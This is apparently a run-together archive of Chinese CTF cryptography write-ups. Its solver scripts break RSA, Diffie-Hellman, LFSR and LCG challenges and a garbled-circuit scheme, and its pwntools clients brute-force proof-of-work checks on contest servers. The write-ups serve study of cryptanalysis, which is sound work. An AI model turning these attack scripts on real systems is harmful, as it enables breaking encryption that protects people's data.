9d0e51d1a2e05cd40a97b469d127714f3c6dd0183956357db25be4c5443ea01aac72ba583d0cd0a72ad4f6fa30d8ace2bbe87f9ff11ddb293539 c8 = 0x187adec8ba464a1a8f911caaabd95a519fc641729d0bbaebd6733362313d718d783961d4db0772de7e1f53c0971b630007554d3f82ca74a6879a08b1572688306dc5759182f20009c4c8cd645eba15e8e1ecb90c7b332685eaeeea0fc5e0f358880c78fcee3aed48ffc28798c553ad43ffc09adcf8797a0177b98ee692d32fd5564dadee8756192685a325012aa460802197bfb04118e1444708403d75fec3888097c3289de53b2491323d4c0f11b0cd6242192f8a40fef3dae1cbdc0a70a2cbca2c746ccf40aa261e87c9a22f2205375c88098dc20d9d5093d9a1b79e4dcf3ff8029a62b4391e16c7c106b05def5ccf1b22565d0ce2deb3eb1b4943ca28999b86e815566f55d2a7a0c8c341adcfea7d608690c217c9128dc41c708c0b3830159947618a1860d11e5bb376b14e20017972116da12364cc4ba87a0fc33a02f55fab863ac5f841915c6ec6301cc56ca8c4fe7a37031df7cea4bedec32ca4d24832772aff2363d4ba6c943ce67bad23b4a643ac24e20cfaaada364d1b389409b2f9fd52632cd8b80a9264ef9e637947f80521d95a4c173649e05f6fb5c5ad350293e08e2215cfab6a7dbc7901a112f59209dd030219665438b708f7fcd7add7d9b1ebc4fc1f9abb6bcb3bfcaa757dd6d6853990371ec788ca5a5885fc979e0339f6d63fddff99472d09a1ff2a055add58ff8b3b4302ba0cc0f330c107e084c7bae53af298 c16 = 0x96e4bd1a084c122aee1d8547b5eb8cff24a3354ea768dfcc99457a62a7ef2b192bef7b032d046cc95a7171f24273bb84bf82f3640eec73f36a1089c5dd24006c96767f1c3753c686a53e37d9f60708649c9ff46d03117acd5318cd1fe266f26aa8a239c99c7339b5dc3c73c075feacfd7cc70b2324fc3d911a4839ff70f6ad900b57d30115750f6e1604e584f8308ed9f130d5be6e731db98cb3568fea1d941fc1b721888053f632ac39b14a1bdeb273a92ce3b2ade717a25126747ec5dd37397b39e9e7b275d343c52f772eac1a6b1b11b3afd4f39cb061946090c65debeb9c67fc395f07229f7747801252d3190afa627a7b9dd07e01b95d9b18e0cacdb7d6bdd855449139e56ae28b8fe38a37adef071811f14a4670c940bc8ea64a58bac4bb0693989501181fbd0ec225d288c8ea21849f2969b16d585a271d3cf9ad4e15ec720c3e24954ef2228e2d91dcd3c5e3765da779344ddc6798ed7d46ed29969fb8e1218830a2dda369adae57531d29c65a4a6b6d232034b047e2af76ccfd966e510612300b248d376e44da1dc32a359d9d8ecc39d2ad48034dbdd5b5a35270da5e42749b9c15ae67e0c46d325efc1c0afb22df74910bad5388a21fe25c31137c6a62cb68e5ddd6754aa9f5961567f89f20ac240d755dab069acdfe3d16b2e83c13f5b58e6b77e132c957ca5eba6b1f9ac83f8f3d81278e4581c17973b8b2e8a85da96 c32 = 0x35ca1593e142b2847125b555abf2a7671d6453932a90752e4a5e14740b0b2d9150ff2a1e26245ba869916304ac8ff448647f03012a0d0ef3530cfbe381bae2c756a3191100f327c9e1254395a79ae38e180a0f06865976c30ad39e8ea0dd0279ef6e3d2e4585271cd1f60befdb53d7e93e368d17453962b60a81fddd5a0842513fabd3553cd64c9a2c6ab7a590c7dbe62ffbad7a7732b344dddfd599cc76249c9c9cd9fc5535d0e5f843516675a90e19c78cac4150035192c3b672f1a46ff1cfb707dc0c9faa49f43526ae52dfaef2cd7248b2836740782856f1b591e45c165fc5ac198809a6622712a560b605a4ec3d9e6d82a383dd05e5fdbf4b79a6cc2c63a651311876a62304cc184e481548b05ef0a7f29b675355c4217c3f33e8a1904d76a8d89f9461feae3412fc6c16430627ff0709e1b44b754bcd1fb823a74cae92775fdc472755dc50c252685d6c8a9c1358f354e705dd69fbc7fb2bdea38e80cb6d89218918272f4b61daf155d8a7ab06a70be70188669c905ea9ff7b1edf8a1042b9fc8dfc21075e1c24b4300b80e17b8f61cb10a6b9de72dc1bdb45b47e90eb58ae89997f3f53373b8ddad181987b6be6f8945396eb9aec245ca5c13258e2c7d1edfe983d9e613036a010c8c85ac2d369ad9021b3eefd67f88482505625d907f0db8ac3970ea1c5a4cbc8194ac6cd0ba669b5635c3e7cc85eb89db38a86f7b569a7d7 e = 0xb0c9850f9011fff3 tmp1 = c2**2-c4 tmp2 = c2**3 - c8 print(gcd(tmp1,tmp2)) #n n = 10692664679893739061346624963756238326909832986911746671432177977106803747834808482664745066503767659342297985398473672934784214154083982701378892833624959949381593211919420949003713490334711964701876174075490998238639603875932591934027218071278526995196688532809816282613164879439054064395793103540418492601028819750817898231215515490781342362667217521611006486460470021774355363986660297005486140235347671147357347288429551570802373902314351315203691963871248380238591559213114056614371235371632060733799353705032408294405889554859476139483322273931964592871077343201918116296915049134397709997524443709019832884220802486622148127987276341842100859233579597766831078061591735155348141665023151980626921512388513676299779091204193339220987799602731968274328056958108046444484197044587876571576648161905099526406757618769384516494063549805092383328953214018195122332164730563740664245705722818506815008751691569465550951862660691258739370213781878542487435891666566514414160543282396596969430691853935887802828041224909086447462208206244058569311336469455693550763462023232696617101031002302783846517806558340968291885996058813639594795019464746186634849088956261950519343976570981323926159821885608523334734068893605509523992806520200051013 c2 = pow(2,e,n) print(hex(c2)) # ========================================= q = 22960690030954031643742873940756387805063632374349798184486158679056793968326082353744810859681157004386764888216226590055321262725333525018162946329363305619138731630622888165955977549876211714272441886170151684654308569015065787094352398847347785663643177996671368014667130798343655987811559205747080364736341114890032293368422580223606501359822058596759086093511987824715524940155176294187511558172399888678858130086673199405724632211823726260671253464305495983658956071316594110302935414507198453006409876448274797313564489027777441015454737825659566520679223546384865017468537310551644663582219910328842894601218987 p = 465694396182284590994715625131230714161417041725952699878736781345012032174229077433177127599212318839252860698357547341108410217873453860041877707176988034842163129340937209451388376485311961183911455765614162925734677267585939412323019039933618486263931972247343936114712480771059070555737146835361052356166634684179750979833279130369193818863085641945469759413602478617023305793042062127374270238398593152253825771645013808373316824228767738910513983082625750695479978910779636917338424693371960346239509252789852394767480118428666311119275133465046795934573038184768396911187352262509744712465822871605090335322209999 print(n-p*q) c = 0x17bb4730ef3ba7591d5ac5aba56596ea7bb5b3cac908375fed01f827a4ad246457bcf4f67be416126bc421b2ec813aca9ebed52c36734be35fd39fd450bd11831f833053743c7822094bf295d17984380d062764f31c8e8725255eec779d375ec82b76b6d8956107264fd9550d0f7407ad6531bbbc79af22cb85191171e0a79c137f180d9376cce93e9a17fb1d7ba985150f73b8d67be7e47c72bf607aa274369aaaa230078eca1bf4daa0326d46b682b1d94c651946417f7f254c1b6531df833deca73b81d9cf026c5038c8021d31fee10efb4a1f041d9180b7b489a9ce0ea12f82c67529c9088f72e84de35aa48ebfd67e7a8fcaf01b07a937bbeeab578710495abcc80f8a2a57a84d5b76e54cd58d160f6e289bf4848b9b87c7b94164fd11b3dca467074a71e02ed9ea72db34915e1276c48339ef6f4c4a9e971e69041117b6a1f2502a475dfbba83b1c61d1b7e427c0de5132f82b73b0ba839bfe4ad93cb8768596d67aa2dfb873a7589d38a89cae70203e9fdbcd2497adf563480ad03163c96be553ba5f72ad2d57358acd9ebeeb00b2a023f5a9406b5549082a618e43773b903d501bd6aab795362dc49024c2a6a17ba33d13731aea574941766dd1a52c3f3d48f9e26901d4e1c3031ba1cd63c5078bc51d3b0f310236d3d2b9e8a9fa4fa01567293e02ef22dea9d3744924f46e5f16f25ad800f3fa93a5f4c4b58c68bbac1 e = 0xb0c9850f9011fff3 phi = (p-1)*(q-1) d = inverse(e,phi) m = pow(c,d,n) print(long_to_bytes(m)) # flag{984af69b-5497-471b-9fa3-cda517490ad2} sharing_system # 简单数学题，做不出来的建议重读初一😅😅😅😅\n用 keys1 给的 y 互相相减得到没有secret的方程\n构造矩阵得到ts\nexp: # from itertools import product from pwn import * from icecream import * from hashlib import sha256 r = remote(\u0026#39;0.0.0.0\u0026#39;,20001) from time import * def gopow(): # print(r.recv(1024)) r.recvuntil(\u0026#39;sha256(XXXX+\u0026#39;) s1 = r.recvuntil(\u0026#39;) == \u0026#39;)[:-5] hashstr = r.recvline()[:-1] print(r.recvuntil(\u0026#39;Give me XXXX \u0026gt;\u0026#39;)) print(s1,hashstr) tab = \u0026#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39; for i in product(tab,repeat=4): tmp = \u0026#39;\u0026#39;.join(i) s0 = bytes(tmp,encoding=\u0026#39;utf-8\u0026#39;) s = s0+s1 hash_value = sha256(s).hexdigest() hash_value = bytes(hash_value,encoding=\u0026#39;utf-8\u0026#39;) if hash_value == hashstr: print(hash_value) ic(\u0026#34;XXXX=\u0026#34;,s0) ic(hash_value,hashstr) print(r.recv(2048)) r.sendline(s0) break gopow() buf = r.recv(1024) print(buf) buf = r.recvuntil(\u0026#39;Enter option \u0026gt; \u0026#39;) print(buf) r.sendline(\u0026#39;1\u0026#39;) buf = r.recvline() # p print(buf) p = int(buf[3:-1]) print(p) buf = r.recvuntil(\u0026#39;key = (\u0026#39;) # key1 x1 = r.recvuntil(\u0026#39;, \u0026#39;) y1 = r.recvuntil(\u0026#39;)\\n\u0026#39;) print(buf,x1,y1) buf = r.recvuntil(\u0026#39;Enter option \u0026gt; \u0026#39;) print(buf) r.sendline(\u0026#39;2\u0026#39;) buf = r.recvline() # p # print(buf) p = int(buf[3:-1]) # print(p) buf = r.recvuntil(\u0026#39;key = (\u0026#39;) # key1 x2 = r.recvuntil(\u0026#39;, \u0026#39;) y2 = r.recvuntil(\u0026#39;)\\n\u0026#39;) print(buf,x1,y1) x1 = int(x1[:-2].decode()) y1 = int(y1[:-2].decode()) x2 = int(x2[:-2].decode()) y2 = int(y2[:-2].decode()) ic(x1) ic(x2) ic(y1) ic(y2) ic(p) keys1 = [[x1,y1]] keys2 = [[x2,y2]] def getXY(): for i in range(1,50): # print(r.recvuntil(\u0026#39;Enter option \u0026gt; \u0026#39;).decode()) r.sendline(\u0026#39;3\u0026#39;) r.recvuntil(\u0026#39;umber (1-49) \u0026gt; \u0026#39;) r.sendline(str(i)) r.recvuntil(\u0026#39;key = (\u0026#39;) x = int(r.recvuntil(\u0026#39;, \u0026#39;)[:-2]) y = int(r.recvuntil(\u0026#39;)\\n\u0026#39;)[:-2]) # print(x,y) keys1.append([x,y]) def getts(key): keys_1 = key XS=[] for i in range(49): xi = keys_1[i][0] xi_1 = keys_1[i+1][0] xs=[] for j in range(49): x1 = pow(xi,j+1,p) x2 = pow(xi_1,j+1,p) tmp = (x1-x2)%p xs.append(tmp) XS.append(xs) YS =[] for i in range(49): yi = keys_1[i][1] yi_1 = keys_1[i+1][1] YS.append([(yi-yi_1)%p]) # print(YS) X = Matrix(Zmod(p),XS) Y = Matrix(Zmod(p),YS) invx = X.inverse() T = invx*Y # print(ts) TS = [i[0] for i in T] return TS getXY() print(keys1) print(len(keys1)) # t = 58510083877094693891040277851267905853617844771064576929521712771940231668984770883328421254238895212042598002659174059244201616561130950785238401399837559644941651285130352373844849078590789578028528768860166902952495931639692465443534927973027133719331474369633030490640443060779278904144461746302422307614 # ts = [ t for _ in range(50 - 1)] ts = getts(keys1) tmp1=0 for i in range(0,49): XS = pow(x1,i+1,p)*ts[i] tmp1 = (tmp1 + XS)%p k1 = (y1 - tmp1)%p tmp2=0 for i in range(0,49): XS = pow(x2,i+1,p)*ts[i] tmp2 = (tmp2 + XS)%p k2 = (y2 - tmp2)%p ic(k1,k2) # print(r.recv(1024)) print(r.recvuntil(\u0026#39;Enter option \u0026gt; \u0026#39;)) r.sendline(\u0026#39;5\u0026#39;) print(r.recvuntil(\u0026#39;Please enter secret 1 \u0026gt; \u0026#39;)) r.sendline(str(k1)) print(r.recvuntil(\u0026#39;Please enter secret 2 \u0026gt; \u0026#39;)) r.sendline(str(k2)) sleep(1) print(r.recv(1024)) er option \u0026gt; \u0026#39; b\u0026#39;Please enter secret 1 \u0026gt; \u0026#39; b\u0026#39;Please enter secret 2 \u0026gt; \u0026#39; b\u0026#39;Wow! How smart you are! Here is your flag: \\nfl{f*ck you!!!}\\nBye!\\n\\n\u0026#39; [*] Closed connection to 0.0.0.0 port 20001 ","date":"5 June 2021","permalink":"/achieve/ctf/bluehat2021/","section":"archive","summary":"","title":"Writeup for crypto in 蓝😼2021"},{"content":"学到hin多\n学妹改了一个能用的代码，可惜细节部分没处理好\n首先用\nhttps://ami.uni-eszterhazy.hu/uploads/papers/finalpdf/AMI_43_from29to41.pdf\n给出的曲线变换来做曲线的映射,再用后面提到的思路在ecc曲线上找点再映射回原来的曲线验证正负性\n文章中提到了范围的证明,这里不做深入\n东拼西凑偷了个通解代码来把玩x：\n# sage n = 6 a = (4*n ^ 2+12*n-3) b = 32*(n+3) ee = EllipticCurve([0, a, 0, b, 0]) # y2=x3+109x2+224x def orig(P, N): x = P[0] y = P[1] a = (8*(N+3)-x+y)/(2*(N+3)*(4-x)) b = (8*(N+3)-x-y)/(2*(N+3)*(4-x)) c = (-4*(N+3)-(N+2)*x)/((N+3)*(4-x)) da = denominator(a) db = denominator(b) dc = denominator(c) l = lcm(da, lcm(db, dc)) return [a*l, b*l, c*l] g = ee.gens() print(g) # [(-200 : 680 : 1)] P = ee(-200, 680) # P = ee(g) print(P) # 只输出一组解 for i in range(1,100): x,y,z = orig(i*P, n) if(x\u0026gt;0 and y\u0026gt;0 and z\u0026gt;0): print(f\u0026#39;x={x}\\n, y={y}\\n, z={z}\\n\u0026#39;) print(f\u0026#39;i = {i}\u0026#39;) break ","date":"8 April 2021","permalink":"/achieve/ctf/%E8%99%8E%E7%AC%A62021/","section":"archive","summary":"","title":"虎符2021"},{"content":" 咕咕咕了太久了,上个有就该做的\nd^3ctf2021 # babyLattice done LLL分解n的应用 simpleGroup done babyLattice LLL分解n + 中国剩余定理特殊应用 + n次剩余判断 AliceWantFlag todo EasyCurve todo simpleGroup # 得矩阵 A 分解 n\nn = 69804507328197961654128697510310109608046244030437362639637009184945533884294737870524186521509776189989451383438084507903660182212556466321058025788319193059894825570785105388123718921480698851551024108844782091117408753782599961943040695892323702361910107399806150571836786642746371968124465646209366215361 b = 65473938578022920848984901484624361251869406821863616908777213906525858437236185832214198627510663632409869363143982594947164139220013904654196960829350642413348771918422220404777505345053202159200378935309593802916875681436442734667249049535670986673774487031873808527230023029662915806344014429627710399196 M = Matrix(ZZ, [ [1, 0, b ^ 2], [0, 1, b], [0, 0, n] ]) M = M.LLL() # tmp1 = abs(M[0][0]) tmp2 = abs(M[0][2]) print(factor(tmp1)) print(factor(tmp2)) a12 = 1018979931854255696816714991181 a22 = 1151291153120610849180830073509 a11 = 1017199123798810531137951821909 a21 = 207806651167586080788016046729 crt\nfrom icecream import * from Crypto.Util.number import * p = 7669036313101194621345265255994200133006921565596653797956940811601516306410232120057637504305295677357422367597831138570269733177579895994340511712373309 q = 9102122415165681824420871673621781250311822805618731863628192549895693024247220594372897360668046264863189831887100676431439200352775676467952192600956629 e = 1928983487 y = 12064801545723347322936991186738560311049061235541031580807549422258814170771738262264930441670708308259694588963224372530498305648578520552038029773849342206125074212912788823834152785756697757209804475031974445963691941515756901268376267360542656449669715367587909233618109269372332127072063171947435639328 C = [63173987757788284988620600191109581820396865828379773315280703314093571300861961873159324234626635582246705378908610341772657840682572386153960342976445563045427986000105931341168525422286612417662391801508953619857648844420751306271090777865836201978470895906780036112804110135446130976275516908136806153488, 9763526786754236516067080717710975805995955013877681492195771779269768465872108434027813610978940562101906769209984501196515248675767910499405415921162131390513502065270491854965819776080041506584540996447044249409209699608342257964093713589580983775580171905489797513718769578177025063630080394722500351718, 37602000735227732258462226884765737048138920479521815995321941033382094711120810035265327876995207117707635304728511052367297062940325564085193593024741832905771507189762521426736369667607865137900432117426385504101413622851293642219573920971637080154905579082646915297543490131171875075081464735374022745371, 1072671768043618032698040622345664216689606325179075270470875647188092538287671951027561894188700732117175202207361845034630743422559130952899064461493359903596018309221581071025635286144053941851624510600383725195476917014535032481197737938329722082022363122585603600777143850326268988298415885565240343957, 27796821408982345007197248748277202310092789604135169328103109167649193262824176309353412519763498156841477483757818317945381469765077400076181689745139555466187324921460327576193198145058918081061285618767976454153221256648341316332169223400180283361166887912012807743326710962143011946929516083281306203120, 27578857139265869760149251280906035333246393024444009493717159606257881466594628022512140403127178174789296810502616834123420723261733024810610501421455454191654733275226507268803879479462533730695515454997186867769363797096196096976825300792616487723840475500246639213793315097434400920355043141319680299224, 29771574667682104634602808909981269404867338382394257360936831559517858873826664867201410081659799334286847985842898792091629138292008512383903137248343194156307703071975381090326280520578349920827357328925184297610245746674712939135025013001878893129144027068837197196517160934998930493581708256039240833145, 33576194603243117173665354646070700520263517823066685882273435337247665798346350495639466826097821472152582124503891668755684596123245873216775681469053052037610568862670212856073776960384038120245095140019195900547005026888186973915360493993404372991791346105083429461661784366706770467146420310246467262823, 5843375768465467361166168452576092245582688894123491517095586796557653258335684018047406320846455642101431751502161722135934408574660609773328141061123577914919960794180555848119813522996120885320995386856042271846703291295871836092712205058173403525430851695443361660808933971009396237274706384697230238104, 61258574367240969784057122450219123953816453759807167817741267194076389100252707986788076240792732730306129067314036402554937862139293741371969020708475839483175856346263848768229357814022084723576192520349994310793246498385086373753553311071932502861084141758640546428958475211765697766922596613007928849964, 13558124437758868592198924133563305430225927636261069774349770018130041045454468021737709434182703704611453555980636131119350668691330635012675418568518296882257236341035371057355328669188453984172750580977924222375208440790994249194313841200024395796760938258751149376135149958855550611392962977597279393428] # 36493 * 52859 e1 = 36493 e2 = 52859 ic(len(C)) \u0026#39;\u0026#39;\u0026#39; p-1 e2互质 q-1 e1互质 \u0026#39;\u0026#39;\u0026#39; def check(d, p, n): if((p - 1) % n == 0): return pow(d, (p - 1) // n, p) == 1 else: k = gcd(n, p - 1) return pow(d, (p - 1) // k, p) == 1 def getM(c, e, p): for i in range(2, e): inv = int(pow(y, i, p)) tmpc = (c * inverse(inv, p)) % p if check(tmpc, p, e): return i exit(0) def func(c): cq = c % q cp = c % p m1 = getM(cp, e1, p) m2 = getM(cq, e2, q) ic(m1,m2) ans = crt([m1,m2],[e1,e2]) ic(hex(ans)) return ans ans=[] for c in C: ans.append(func(c)) tot =0 ans=ans[::-1] for i in ans: tot*=e tot+=i print(tot) print(long_to_bytes(tot)) ","date":"21 March 2021","permalink":"/achieve/ctf/d3ctf2021/","section":"archive","summary":"","title":"d3ctf2021"},{"content":"\rHGAME 2021网络攻防大赛crypto wp # EncryptedChats # Description\nSwitch 的病友 Million 来监狱探监\u0026hellip;\nChallenge Address\nSwitch: 你好老伙汁 Million: 你好 Switch: 所以为什么这家伙在这里 Liki: 因为我是来记录你们谈话内容的 Million: 好吧 Million: 不过我可以提一个要求吗 Liki: ? Million: 我们...换一个群聊 Switch: 好啊! 我看看, 就换到加法群聊吧! Switch: 喂, 帮忙选一个质数 g 吧 Liki: ??, 12602983924735419868428783329859102652072837431735895060811258460532600319539509800915989811879506790207025505003183121812480524033163157114086741486989697 Million: 这位女士，可以劳烦您再为我们选择一个质数 p 吗 Liki: ???...那就, 30567260905179651419358486099834315837354102714690253338851161207042846254351374572818884286661092938876675032728700590336029243619773064402923830209873155153338320502164587381848849791304214084993139233581072431814555885408821184652544361671134564827265516331283076223247829980225591857643487356406284913560960657053777612115591241983729716542192518684003840806442329098770424504275465756739925434019460351138273272559738332984560095465809481270198689251655392941966835733947437503158486731906649716026200661065054914445245468517406404904444261196826370252359102324767986314473183183059212009545789665906197844518119 吧, 够大了吗? Million: 好的, 我选好我的 a 了, 那么 A = 6407001517522031755461029087358686699246016691953286745456203144289666065160284103094131027888246726980488732095429549592118968601737506427099198442788626223019135982124788211819831979642738635150279126917220901861977041911299607913392143290015904211117118451848822390856596017775995010697100627886929406512483565105588306151304249791558742229557096175320767054998573953728418896571838697779621641522372719890056962681223595931519174265357487072296679757688238385898442549594049002467756836225770565740860731932911280385359763772064721179733418453824127593878917184915316616399071722555609838785743384947882543058635 # A = g ^ a % p = pow(g, a, p) Switch: okay, b 也选好了, B = 5522084830673448802472379641008428434072040852768290130448235845195771339187395942646105104638930576247008845820145438300060808178610210847444428530002142556272450436372497461222761977462182452947513887074829637667167313239798703720635138224358712513217604569884276513251617003838008296082768599917178457307640326380587295666291524388123169244965414927588882003753247085026455845320527874258783530744522455308596065597902210653744845305271468086224187208396213207085588031362747352905905343508092625379341493584570041786625506585600322965052668481899375651376670219908567608009443985857358126335247278232020255467723 # B = g ^ b % p = pow(g, b, p) Liki: ???? Million: {\u0026#39;iv\u0026#39;: \u0026#39;d3811beb5cd2a4e1e778207ab541082b\u0026#39;, \u0026#39;encrypted_flag\u0026#39;: \u0026#39;059e9c216bcc14e5d6901bcf651bee361d9fe42f225bc0539935671926e6c092\u0026#39;} Switch: {\u0026#39;iv\u0026#39;: \u0026#39;b4259ed79d050dabc7eab0c77590a6d0\u0026#39;, \u0026#39;encrypted_flag\u0026#39;: \u0026#39;af3fe410a6927cc227051f587a76132d668187e0de5ebf0608598a870a4bbc89\u0026#39;} Million: 再见伙汁 Switch: 再见 Liki: ????? 加法群的幂是乘法\nfrom Crypto.Cipher import AES from Crypto.Util.Padding import pad, unpad from Crypto.Util.number import long_to_bytes import hashlib import gmpy2 as gp from binascii import a2b_hex A = 6407001517522031755461029087358686699246016691953286745456203144289666065160284103094131027888246726980488732095429549592118968601737506427099198442788626223019135982124788211819831979642738635150279126917220901861977041911299607913392143290015904211117118451848822390856596017775995010697100627886929406512483565105588306151304249791558742229557096175320767054998573953728418896571838697779621641522372719890056962681223595931519174265357487072296679757688238385898442549594049002467756836225770565740860731932911280385359763772064721179733418453824127593878917184915316616399071722555609838785743384947882543058635 B = 5522084830673448802472379641008428434072040852768290130448235845195771339187395942646105104638930576247008845820145438300060808178610210847444428530002142556272450436372497461222761977462182452947513887074829637667167313239798703720635138224358712513217604569884276513251617003838008296082768599917178457307640326380587295666291524388123169244965414927588882003753247085026455845320527874258783530744522455308596065597902210653744845305271468086224187208396213207085588031362747352905905343508092625379341493584570041786625506585600322965052668481899375651376670219908567608009443985857358126335247278232020255467723 p = 30567260905179651419358486099834315837354102714690253338851161207042846254351374572818884286661092938876675032728700590336029243619773064402923830209873155153338320502164587381848849791304214084993139233581072431814555885408821184652544361671134564827265516331283076223247829980225591857643487356406284913560960657053777612115591241983729716542192518684003840806442329098770424504275465756739925434019460351138273272559738332984560095465809481270198689251655392941966835733947437503158486731906649716026200661065054914445245468517406404904444261196826370252359102324767986314473183183059212009545789665906197844518119 g = 12602983924735419868428783329859102652072837431735895060811258460532600319539509800915989811879506790207025505003183121812480524033163157114086741486989697 x1 = gp.invert(g,p)*A%p x2 = gp.invert(g,p)*B%p key1 = x1*x2*g%p shared_secret = key1 sha1 = hashlib.sha1() sha1.update(str(shared_secret).encode(\u0026#39;ascii\u0026#39;)) key = sha1.digest()[:16] iv1 = a2b_hex(\u0026#39;d3811beb5cd2a4e1e778207ab541082b\u0026#39;) iv2= a2b_hex(\u0026#39;b4259ed79d050dabc7eab0c77590a6d0\u0026#39;) data1 = a2b_hex(\u0026#39;059e9c216bcc14e5d6901bcf651bee361d9fe42f225bc0539935671926e6c092\u0026#39;) data2 = a2b_hex(\u0026#39;af3fe410a6927cc227051f587a76132d668187e0de5ebf0608598a870a4bbc89\u0026#39;) decrypt1 = AES.new(key,AES.MODE_CBC,iv1) decrypt2 = AES.new(key,AES.MODE_CBC,iv2) flag1 = decrypt1.decrypt(data1) flag2 = decrypt2.decrypt(data2) print(flag1,flag2) # hgame{AdD!tiVe-Gr0up~DH_K3y+eXch@nge^4nd=A3S} 夺宝大冒险2 # lfsr基础\nfrom icecream import * from pwn import * # nc 30607 sh = remote(\u0026#39;182.92.108.71\u0026#39;, 30607) ans = [] for i in range(10): buf = sh.recvuntil(\u0026#39;guess:\u0026#39;) sh.sendline(\u0026#39;-1\u0026#39;) sh.recvuntil(\u0026#39;Wrong, the secret is \u0026#39;) buf = int(sh.recvuntil(\u0026#39;\\n\u0026#39;)[:-1]) # print(buf) ans.append(buf) print(ans) bstr = \u0026#39;\u0026#39; for i in ans: ic(i, bin(i)[2:].rjust(4, \u0026#39;0\u0026#39;)) bstr += bin(i)[2:].rjust(4, \u0026#39;0\u0026#39;) s = bstr ic(bstr,len(s)) init = int(bstr[:40],2) ic(init) class LXFIQNN(): def __init__(self, init, mask, length): self.init = init self.mask = mask self.lengthmask = 2**(length+1)-1 def next(self): nextdata = (self.init \u0026lt;\u0026lt; 1) \u0026amp; self.lengthmask i = self.init \u0026amp; self.mask \u0026amp; self.lengthmask output = 0 while i != 0: output ^= (i \u0026amp; 1) i = i \u0026gt;\u0026gt; 1 nextdata ^= output self.init = nextdata return output def random(self, nbit): output = 0 for _ in range(nbit): output \u0026lt;\u0026lt;= 1 output |= self.next() return output prng = LXFIQNN(init, 0b1011001010001010000100001000111011110101, 40) for i in range(81): secret = prng.random(4) sh.sendline(str(secret)) print(sh.recvuntil(\u0026#39;guess\u0026#39;)) sh.interactive() #hgame{lfsr_121a111y^use-in\u0026amp;crypto} 夺宝大冒险1 # 保证$a\u0026lt;c,b\u0026lt;c,a,b,c互质$,task1,2 很容易求出来\ntask3用选择明文是思想先把a,b消掉,对tmp1,tmp2取最大公因数,平均跑50次由一组适合我们这个算法的a,b,c\nfrom icecream import * from libnum import * from pwn import * # print(sh.recvline()) def t1(sh): s = sh.recvline().decode() ic(s) s =s.split(\u0026#39;,\u0026#39;) print(((s[0][1:]), (s[1][:-1]))) a,c = (int(s[0][1:]),int(s[1][:-2])) m1 = int(sh.recvline()) m2 = int(sh.recvline()) b = (m2-a*m1)%c # ic(b,int(sh.recvline())) # ic(b) sh.sendline(str(b)) def t2(sh): c = int(sh.recvline()) m = [0]+[int(sh.recvline()) for i in range(3)] a = (m[2]-m[3])*(invmod(m[1]-m[2],c)) a %= c b = m[2]-a*m[1] b %= c # ic(a, sh.recvline()) # ic(b, sh.recvline()) # ic(a,b) sh.sendline(str(a)) sh.sendline(str(b)) def t3(sh): m = [123]+[int(sh.recvline()) for i in range(7)] ic(m, len(m)) # tmp1 = -(m[7]-m[6])*(m[5]-m[4])-(m[6]-m[5])*(m[6]-m[5]) tmp1 = abs((m[4]-m[3])*(m[2]-m[1])-(m[3]-m[2])*(m[3]-m[2])) tmp2 = abs((m[7]-m[6])*(m[5]-m[4])-(m[6]-m[5])*(m[6]-m[5])) ic(tmp1, tmp2) tmp = gcd(tmp1, tmp2) # ic(tmp, int(sh.recvline())) # ic(tmp) sh.sendline(str(tmp)) # print(tmp1 % .cgen, tmp2 % gen.c) # nc 182.92.108.71 30641 def main(): tot =0 while 1: tot+=1 try: sh = remote(\u0026#39;182.92.108.71\u0026#39;, 30641) t1(sh) t2(sh) t3(sh) buf = (sh.recvall()) print(buf) if b\u0026#39;win\u0026#39; in buf: print(f\u0026#39;try {tot} times\u0026#39;) break except: pass if __name__ == \u0026#39;__main__\u0026#39;: main() \u0026#39;\u0026#39;\u0026#39; [+] Receiving all data: Done (56B) [*] Closed connection to 182.92.108.71 port 30641 b\u0026#39;win\\nhgame{Cracking^prng_Linear)Congruential\u0026amp;Generators}\\n\u0026#39; try 46 times \u0026#39;\u0026#39;\u0026#39; ","date":"26 February 2021","permalink":"/achieve/ctf/hgame2021/","section":"archive","summary":"","title":"hgame2021 密码学 writeup"},{"content":"[toc]\ngarbled # 这个有意思了\n文件里面给了一堆文件，并有一个示例文件和flag获取文件来调用整个加密电路\nfrom generate_garbled_circuit import g_tables, keys\n分析一遍数据生成流程\n生成了7组key，每组两个元素为 keyi0，keyi1 每个元素的小于2**24 将7组数据按照“门”的指引得到 3 组加密后的 table 每组4行没行两个元素从左到右分别为 gl，v 具体流程如下，以第1组table生成的情况示例：\ninput : key1,key2,key5 # g_tables 钟元素的顺序 g_tables = {5: [(g1, v1), (g2, v2), (g3, v3), (g4, v4)], g1 = enc(key5_0,(key1_0,key2_0)) g2 = enc(key5_0,(key1_0,key2_1)) g3 = enc(key5_0,(key1_1,key2_0)) g4 = enc(key5_1,(key1_1,key2_1)) v1 = enc(0,(key1_0,key2_0)) v2 = enc(0,(key1_0,key2_1)) v3 = enc(0,(key1_1,key2_0)) v4 = enc(0,(key1_1,key2_1)) 分析调用电路生成input的代码发现input的4个元素为 $key_{11},key_{21},key_{31},key_{41}$\nevaluate_circuit 对 g_tables内容进行解密，恢复出 $key_{51},key_{61},key_{71}$\n以第一组 g_tables 即 key1，key2，key5为例\nkey5_1 = dec(g1, (key1_1, key2_1)) 0 = dec(v1, (key1_1, key2_1)) def dec(data, key1, key2): decrypted = decrypt_data(data, key2) decrypted = decrypt_data(decrypted, key1) return decrypted 通过key1_1~4_1可以恢复出所有keyi_1\n你问我为什么不恢复出所有key？\n这就涉及到GarbledCircuit设计初衷了 咕咕咕\n对解密的场景可以扩展出这样的式子\n0 = dec(v1, (key1_0, key2_0)) 0 = dec(v2, (key1_0, key2_1)) 0 = dec(v3, (key1_1, key2_0)) 0 = dec(v4, (key1_1, key2_1)) 我们可以想办法找出所有的key1,key2开缩小范围，但2**48的复杂度是我们不愿意看到的，这里用中间相遇攻击的思想将复杂度降到$O(2\\times2^{24})$,这是一个我们可以接受的范围\n现在，我们得到了所有满足下式成立的key，需要我们想办法准确的定位地定位到 key1_1, key2_1\n0 = dec(v1, (key1_0, key2_0)) 0 = dec(v2, (key1_0, key2_1)) 0 = dec(v3, (key1_1, key2_0)) 0 = dec(v4, (key1_1, key2_1)) 由数据生成的代码我们可知：\nkey5_0 = dec(g1, (key1_0, key2_0)) key5_0 = dec(g2, (key1_0, key2_1)) key5_0 = dec(g3, (key1_1, key2_0)) key5_1 = dec(g4, (key1_1, key2_1)) $algorithm1$\n$$ assume (k11,k21)is\\;global\\;keys\\\\\\\\ 